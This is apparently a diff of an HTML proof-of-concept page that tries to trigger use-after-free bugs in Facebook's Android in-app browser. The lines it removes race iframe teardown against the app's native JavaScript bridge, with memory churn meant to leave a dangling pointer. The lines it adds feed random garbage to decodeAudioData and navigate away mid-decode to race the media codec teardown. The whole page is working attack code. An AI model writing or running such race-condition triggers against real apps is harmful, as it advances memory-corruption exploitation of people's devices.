@@ -1,63 +1,57 @@
 <!DOCTYPE html>
 <html>
-<head><title>V8 Callback UAF Fuzzer</title></head>
-<body style="background:#000; color:#f00; font-family:monospace;">
-    <h3>Attacking V8 Bridge Contexts...</h3>
-    <div id="container"></div>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MediaCodec UAF Fuzzer</title>
+</head>
+<body style="background:#000; color:#0ff; font-family:monospace;">
+    <h3>Attacking libhelium Media Pipeline...</h3>
+    <div id="status">Generating corrupted media payload...</div>
 
     <script>
-        const container = document.getElementById('container');
-        
-        // We sweep the teardown timing from 1ms to 50ms to catch the exact 
-        // microsecond the C++ thread tries to invoke the callback
-        let raceTiming = 1; 
-        
-        function fireCallbackUAF() {
-            // 1. Create an isolated V8 Context (IFrame)
-            let iframe = document.createElement('iframe');
-            container.appendChild(iframe);
-            let iwin = iframe.contentWindow;
+        const statusEl = document.getElementById('status');
+
+        function fireMediaUAF() {
+            statusEl.innerText = "[*] Spawning AudioContext...";
             
-            // 2. Create the target object inside the isolated context
-            // Facebook's C++ bridge will attempt to store a pointer to this
-            iwin._AutofillCallbackHandler = {
-                invoke: function(id, data) { console.log("Callback triggered"); }
-            };
-            
-            let uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
-            let initPayload = JSON.stringify({
-                "message": {
-                    "name": "_AutofillCallbackHandler",
-                    "callbackID": "f876739fb"
-                }
-            });
-            
-            // 3. Register the callback with Facebook's native bridge
-            if (window.__call_iabjs_unified_bridge) {
-                try {
-                    window.__call_iabjs_unified_bridge("initializeCallbackHandler", uuid, initPayload);
-                    // Trigger a secondary action to force async processing
-                    window.__call_iabjs_unified_bridge("BrowserDeclutterJS", uuid, '{"event":"init"}');
-                } catch(e) {}
+            // 1. Initialize the native audio bridge
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            const ctx = new AudioContext();
+
+            // 2. Create 2MB of absolute garbage data. 
+            // We want this to take the hardware decoder a few milliseconds to process and eventually fail.
+            const bufferSize = 1024 * 1024 * 2; 
+            const buffer = new ArrayBuffer(bufferSize);
+            const view = new Uint8Array(buffer);
+            for (let i = 0; i < bufferSize; i++) {
+                view[i] = Math.floor(Math.random() * 256); // Random noise
             }
-            
-            // 4. The UAF Race: Destroy the V8 Context right as C++ tries to call the handler
+
+            statusEl.innerText = "[*] Choking hardware decoder...";
+
+            // 3. Send the garbage to the native C++ decoder
+            // This is asynchronous and crosses the boundary to the Android OS
+            ctx.decodeAudioData(buffer, 
+                function(decodedData) {
+                    // Won't happen, it's garbage
+                }, 
+                function(error) {
+                    // By the time this error fires, we want the C++ object to be DEAD.
+                    console.log("Decode error fired");
+                }
+            );
+
+            // 4. The Teardown Race
+            // Instantly navigate away to destroy the WebContents and trigger releaseAsync
+            // while the hardware is actively processing the garbage buffer.
             setTimeout(() => {
-                iframe.remove();
-                
-                // Force memory churn to overwrite the freed V8 object
-                // This ensures the C++ pointer becomes a true dangling pointer
-                let trash = new Array(5000).fill("A".repeat(1000));
-                
-                // Increment our sniper scope
-                raceTiming++;
-                if(raceTiming > 50) raceTiming = 1;
-                
-            }, raceTiming);
+                window.location.href = "about:blank";
+            }, 10); // 10ms is usually the sweet spot for MediaCodec races
         }
 
-        // Fire 10 times a second to flood the bridge with dangling callbacks
-        setInterval(fireCallbackUAF, 100);
+        // Delay slightly to ensure FB has fully attached the surface, then fire
+        setTimeout(fireMediaUAF, 500);
+
     </script>
 </body>
 </html>
